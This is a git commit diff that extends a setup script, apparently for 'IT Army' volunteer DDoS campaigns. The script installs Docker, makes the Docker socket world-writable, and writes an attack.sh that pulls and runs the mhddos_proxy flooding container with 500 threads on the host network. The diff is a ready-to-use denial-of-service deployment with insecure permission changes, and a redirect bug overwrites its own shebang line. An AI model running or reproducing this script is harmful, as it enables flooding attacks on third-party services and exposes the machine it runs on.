889c16d0c56c1b112fd65e5c7bcbc70e65b9c27a
Andrii Androsovych <55437123+aaw20904@users.noreply.github.com>
2023-04-01 11:57:15 +0300

    Update itarmy.sh

--- itarmy.sh
+++ itarmy.sh
@@ -18,3 +18,19 @@ sleep 1
 free -h
 sleep 1
 echo '/swapfile none swap sw 0 0' | sudo tee -a /etc/fstab
+sudo apt update 
+sudo apt install -y docker.io 
+sudo systemctl enable docker --now 
+docker 
+sudo usermod -aG docker $USER
+printf '%s\n' "deb https://download.docker.com/linux/debian bullseye stable" | sudo tee /etc/apt/sources.list.d/docker-ce.list ; curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/docker-ce-archive-keyring.gpg
+sudo apt update 
+sudo apt install -y docker-ce docker-ce-cli containerd.io screen 
+sudo systemctl unmask docker.service 
+sudo systemctl unmask docker.socket 
+sudo systemctl start docker.service 
+sudo chmod 666 /var/run/docker.sock 
+sudo docker run hello-world
+echo "#!/bin/bash" > attack.sh
+echo "docker run -d -it --rm --pull always --net=host ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 500 --lang UA" > attack.sh
+chmod 777 attack.sh
